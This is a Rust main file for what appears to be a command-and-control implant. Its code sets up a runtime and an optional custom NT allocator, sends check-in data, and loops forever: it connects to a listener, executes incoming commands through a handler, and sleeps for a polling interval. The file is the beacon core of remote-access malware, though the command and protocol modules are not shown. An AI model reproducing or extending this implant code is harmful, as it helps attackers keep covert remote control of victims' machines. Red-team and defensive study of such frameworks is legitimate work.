use libc_print::libc_println;

use std::{sync::Arc, time::Duration};

pub mod command;
pub mod common;
pub mod handler;
pub mod init;
pub mod spawner;

use handler::command_handler;

#[cfg(feature = "ntallocator")]
use mod_ntallocator::NtAllocator;

// Set a custom global allocator
#[cfg(feature = "ntallocator")]
#[global_allocator]
static GLOBAL: NtAllocator = NtAllocator;

use init::{init_checkin_data, init_protocol};
use mod_agentcore::instance;

#[cfg(feature = "tokio-runtime")]
use mod_tokio_runtime::TokioRuntimeWrapper;

#[cfg(feature = "std-runtime")]
use mod_std_runtime::CustomRuntime;

/// Main routine that initializes the runtime and repeatedly checks the connection status.
pub fn routine() {
    // let rt = Arc::new(
    //     Builder::new_multi_thread()
    //         .worker_threads(4)
    //         .enable_all()
    //         .build()
    //         .unwrap(),
    // );
    #[cfg(feature = "tokio-runtime")]
    let rt = Arc::new(TokioRuntimeWrapper::new(4));

    #[cfg(feature = "std-runtime")]
    let rt = Arc::new(CustomRuntime::new(4));

    loop {
        unsafe {
            if !instance().session.connected {
                // If not connected, try to connect to the listener
                init_protocol(rt.clone());
            }

            if instance().session.connected {
                // If connected, handle incoming commands
                command_handler(rt.clone());
            }

            // Sleep for 15 seconds before checking again, ensuring all tasks are done.
            libc_println!("Sleep: {}", instance().config.polling_interval);
            rt.handle().block_on(async {
                tokio::time::sleep(Duration::from_secs(
                    instance().config.polling_interval as u64,
                ))
                .await;
            });
        }
    }
}

/// Main function that initializes the global instance, checkin data, and starts the routine.
fn main() {
    // init_global_instance(); // Initialize global instance
    init_checkin_data(); // Initialize checkin data
    routine(); // Start the main routine
}
